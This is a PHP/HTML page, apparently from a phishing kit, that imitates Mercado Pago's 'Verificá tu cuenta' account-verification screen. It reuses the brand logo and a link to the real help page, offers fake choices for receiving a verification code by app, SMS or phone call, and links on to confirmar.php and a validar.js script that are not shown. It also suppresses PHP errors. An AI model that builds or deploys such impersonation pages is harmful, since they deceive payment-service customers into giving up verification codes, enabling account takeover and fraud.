<?php
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Verificá tu cuenta</title>
    <link rel="shortcut icon" href="fotes/logoo.ico" />
    <!--<META HTTP-EQUIV="REFRESH" CONTENT="5;URL=http://localhost/mg/index.php">-->
    <script src="https://kit.fontawesome.com/5b23b3e9e6.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" type="text/css" href="css/verificar.css">
</head>

<body>
    <div class="container">
        <div class="banner">
            <div class="img">
                <img src="fotes/mp.png" height="35" alt="">
            </div>
            <a href="https://www.mercadopago.com.ar/ayuda" class="pregunta"><i class="fas fa-question"></i></a>
        </div>
        <div class="body">
            <div class="formulario">
                <h2>Verificá que esta cuenta te pertenece</h2>
                <p>Elegí cómo recibir el código de verificación.</p>
                <div class="opciones">
                    <div class="opcion">
                        <div class="icono"><i class="far fa-bell"></i></div>
                        <div class="texto">
                            <div class="principal">App de Mercado Libre</div>
                            <div class="secundario">Por medio de una notificación</div>
                        </div>
                        <div class="flechita"><i class="fas fa-angle-right"></i></div>
                    </div>
                    <div class="opcion">
                        <div class="icono"><i class="far fa-comment-alt"></i></div>
                        <div class="texto">
                            <div class="principal">SMS</div>
                            <div class="secundario">Al celular terminado en 1049</div>
                        </div>
                        <div class="flechita"><i class="fas fa-angle-right"></i></div>
                    </div>
                    <div class="opcion">
                        <div class="icono"><img src="fotes/images.png" height="22" alt=""></div>
                        <div class="texto">
                            <div class="principal">Llamada telefónica</div>
                            <div class="secundario">Al celular terminado en 1049</div>
                        </div>
                        <div class="flechita"><i class="fas fa-angle-right"></i></div>
                    </div>
                </div>
                <a class="verificar" href="confirmar.php">Verificar de otra forma</a>
            </div>
        </div>
    </div>
    </div>
    <script src="validar.js"></script>


</body>

</html>